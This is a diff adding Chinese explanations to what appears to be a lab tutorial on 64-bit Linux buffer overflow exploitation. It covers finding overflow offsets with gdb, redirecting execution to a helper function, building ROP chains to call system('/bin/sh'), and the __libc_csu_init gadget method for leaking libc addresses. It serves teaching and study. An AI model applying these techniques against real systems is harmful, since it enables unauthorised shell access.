@@ -166,8 +166,12 @@ $ whoami<br>
 [用户名] <br><br>
 
 ## linux_64
+linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。<br><br>
+
 ### linux_64溢出攻击（利用辅助函数）
+我们打开ASLR编译level3
 $ gcc -fno-stack-protector level3.c -o level3<br>
+通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。<br><br>
 $ python pattern.py create 150 > payload<br>
 $ gdb ./level3<br>
 (gdb) run < payload<br>
@@ -175,10 +179,12 @@ Starting program: /home/dzh/learning/level3 < payload<br>
 Hello, World<br>
 
 Program received signal SIGSEGV, Segmentation fault.<br>
-0x00000000004005e7 in vulnerable_function ()<br>
+0x00000000004005e7 in vulnerable_function ()<br><br>
+PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。<br>
 (gdb) x/gx $rsp<br>
 0x7fffffffde68:	0x3765413665413565<br>
-(gdb) quit<br>
+(gdb) quit<br><br>
+利用pattern脚本得到溢出点
 $ python pattern.py offset 0x3765413665413565<br>
 hex pattern decoded as: e5Ae6Ae7<br>
 136<br>
@@ -190,7 +196,9 @@ Hello, World<br>
 
 Program received signal SIGSEGV, Segmentation fault.<br>
 0x0000464544434241 in ?? ()<br>
+因为是小端机，这里我们已经看出我们已经成功控制了PC指针<br>
 (gdb) quit<br>
+ 我们可以通过objdump 查看cllsystem地址完成攻击<br>
 $ objdump -d level3 | grep callsystem<br>
 00000000004005b6 <callsystem>:<br>
 python exp5.py<br>
@@ -206,17 +214,24 @@ $ whoami<br>
 3. ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
 4. rp++: https://github.com/0vercl0k/rp
 <br>
+查看level4会发现首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行system(“/bin/sh”)。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下level4和libc.so中所有pop ret的gadgets。<br>
 gcc -fno-stack-protector level4.c -o level4 -ldl<br>
 $ ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi<br>
 0x0000000000020256 : pop rdi ; pop rbp ; ret<br>
 0x0000000000021102 : pop rdi ; ret<br>
+这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了<br>
 $ python exp6.py<br>
 [*] '/home/dzh/learning/libc.so.6'<br>
-$ whoami
+$ whoami<br>
 [用户名] <br><br>
 
 ### 通用ROP攻击
+在去掉所有辅助函数后该如何构造ROP链呢？可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./level5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。<br><br>
 $ objdump -d ./level5
+我们可以看到利用0x400616处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x400600处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。<br>
+我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。<br>
+当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。<br>
+最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。<br>
 $ python exp7.py<br>
 [*] '/home/dzh/learning/level5'<br>
 [+] Starting local process './level5': pid 4031<br>
